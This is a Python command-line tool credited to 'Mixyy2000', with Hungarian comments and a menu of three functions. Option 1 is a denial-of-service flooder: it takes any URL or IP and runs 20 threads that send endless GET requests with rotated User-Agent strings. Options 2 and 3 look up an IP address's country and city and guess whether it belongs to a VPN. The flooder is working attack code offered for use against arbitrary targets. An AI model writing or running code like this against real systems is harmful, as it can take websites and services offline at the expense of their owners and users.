import requests
import threading
import time
import os
import sys
import random
from colorama import init, Fore, Style

# Initializáljuk a színeket
init(autoreset=True)

# Színek
RED = Fore.RED
GREEN = Fore.GREEN
RESET = Style.RESET_ALL

# A felirat (ASCII Art)
BANNER = f"""{RED}
oooooooooooo                               o8o                .
`888'     `8                               `"'              .o8
 888          .oooo.o  .ooooo.   .ooooo.  oooo   .ooooo.  .o888oo oooo    ooo
 888oooo8    d88(  "8 d88' `88b d88' `"Y8 `888  d88' `88b   888    `88.  .8'
 888    "    `"Y88b.  888   888 888        888  888ooo888   888     `88..8'
 888         o.  )88b 888   888 888   .o8  888  888    .o   888 .    `888'
o888o        8""888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P'   "888"     .8'
                                                                  .o..P'
                                                                  `Y8P'
Author : Mixyy2000{RESET}"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_ip_info(ip_address):
    try:
        url = f"http://ip-api.com/json/{ip_address}?lang=hu"
        response = requests.get(url, timeout=5)
        data = response.json()
        if data.get('status') == 'fail':
            return {"error": data.get('message', 'Ismeretlen hiba')}, None

        isp = data.get('isp', '')
        is_vpn = False
        vpn_keywords = ['vpn', 'proxy', 'hosting', 'cloudflare', 'tor']
        for kw in vpn_keywords:
            if kw in isp.lower():
                is_vpn = True
                break
        return {
            "country": data.get('country', 'Nem található'),
            "city": data.get('city', 'Nem található'),
            "isp": isp,
            "is_vpn": is_vpn
        }, data.get('query')
    except requests.exceptions.RequestException as e:
        return {"error": f"Hálózat hiba: {str(e)}"}, None

def option_1_ddos():
    clear_screen()
    print(BANNER)
    target = input(f"{GREEN}Enter URL or IP adress: {RESET}")
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "http://" + target

    print(f"{GREEN}DDoS attack started on {target}... (Press Ctrl+C to stop){RESET}")
    session = requests.Session()
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)"
    ]

    # Lock használata, hogy a szálak ne zavarják egymást a nyomtatásnál
    print_lock = threading.Lock()

    def send_request():
        while True:
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                session.get(target, headers=headers, timeout=0.5)
                with print_lock:
                    print(f"{GREEN}Request sent{RESET}")
            except requests.exceptions.RequestException as e:
                with print_lock:
                    print(f"{RED}Request failed : {e}{RESET}")

    # 20 szál = nagyon gyors requestek
    for _ in range(20):
        t = threading.Thread(target=send_request, daemon=True)
        t.start()

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Attack stopped.{RESET}")

def option_2_ip_locate():
    clear_screen()
    print(BANNER)
    ip = input(f"{GREEN}Enter IP Adress: {RESET}")
    info, queried_ip = get_ip_info(ip)
    if "error" in info:
        print(f"{RED}Hiba: {info['error']}{RESET}")
    else:
        vpn_status = "Igen" if info['is_vpn'] else "Nem"
        print(f"{GREEN}\nIP: {queried_ip}\nCountry: {info['country']}\nCity: {info['city']}\nVPN: {vpn_status}{RESET}")
    input(f"\n{GREEN}Press Enter to continue...{RESET}")

def option_3_vpn_test():
    clear_screen()
    print(BANNER)
    print(f"{GREEN}Testing VPN...{RESET}")
    info, my_ip = get_ip_info("")
    if "error" in info:
        print(f"{RED}Hiba: {info['error']}{RESET}")
    else:
        vpn_res = "Igen" if info['is_vpn'] else "Nem"
        # Itt már nem "VPN status" hanem csak "VPN" szerepel
        print(f"{GREEN}\nYour IP    : {my_ip}\nCountry    : {info['country']}\nCity       : {info['city']}\nVPN        : {vpn_res}{RESET}")
    input(f"\n{GREEN}Press Enter to continue...{RESET}")

def main_menu():
    while True:
        clear_screen()
        print(BANNER)
        print(f"{GREEN}1. DDoS")
        print(f"2. IP locate")
        print(f"3. VPN test")
        print(f"4. Exit{RESET}")
        choice = input(f"\n{GREEN}Select an option (1-4): {RESET}")
        if choice == '1': option_1_ddos()
        elif choice == '2': option_2_ip_locate()
        elif choice == '3': option_3_vpn_test()
        elif choice == '4':
            print(f"{RED}Goodbye!{RESET}")
            break
        else:
            print(f"{RED}Invalid option!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        sys.exit(0)